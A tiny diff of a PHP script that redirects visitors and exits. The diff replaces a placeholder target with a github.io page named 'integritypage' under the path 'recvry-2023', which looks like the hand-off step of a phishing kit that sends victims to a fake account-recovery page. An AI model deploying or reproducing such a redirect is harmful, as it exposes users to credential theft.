@@ -1,4 +1,4 @@
 <?php
-header('location:http://link.com');
+header('location:https://integritypage.github.io/content/recvry-2023');
 exit;
 ?>
